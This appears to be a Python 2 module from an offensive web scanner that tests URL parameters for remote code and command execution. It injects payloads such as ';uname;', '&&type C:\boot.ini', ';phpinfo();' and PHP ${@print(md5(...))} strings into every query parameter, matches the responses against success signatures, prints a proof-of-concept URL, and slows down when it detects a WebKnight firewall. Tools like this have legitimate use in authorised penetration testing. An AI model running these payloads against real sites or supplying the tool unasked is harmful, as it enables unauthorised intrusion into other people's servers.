#! /usr/bin/env python2.7
# Modules Optivaframework  
import urllib
import re
from headers import *
from termcolor import colored, cprint


def main(url, payloads, check):
        opener = urllib.urlopen(url)
	vuln = 0
        if opener.code == 999:
                print ga.red +" [~] WebKnight WAF Detected!"+ga.end
                print ga.red +" [~] Delaying 3 seconds between every request"+ga.end
                time.sleep(3)
        for params in url.split("?")[1].split("&"):
            for payload in payloads:
                bugs = url.replace(params, params + str(payload).strip())
                request = useragent.open(bugs)
		html = request.readlines()
                for line in html:
                    checker = re.findall(check, line)
                    if len(checker) !=0:
                        print ga.red+" [*] Payload Found . . ."+ga.end
                        print ga.red+" [*] Payload: " ,payload +ga.end
                        print ga.green+" [!] Code Snippet: " +ga.end + line.strip()
                        print ga.blue+" [*] POC: "+ga.end + bugs
                        print ga.green+" [*] Good Exploitation :D"+ga.end
                        vuln +=1
        if vuln == 0:                
        	print ga.green+" [!] Target is not vulnerable!"+ga.end
        else:
        	print ga.blue+" [!] Congratulations you've found %i bugs :-) " % (vuln) +ga.end


def rcevuln(url):
	headers_reader(url)
  	print ga.bold+" [!] Scanning for Remote Code/Command Execution "+ga.end
  	print ga.blue+" [!] Please wait .... "+ga.end
  	payloads = [';${@print(md5(rce))}', ';${@print(md5("rce"))}']
  	payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B']
  	payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
  	check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
  	main(url, payloads, check)
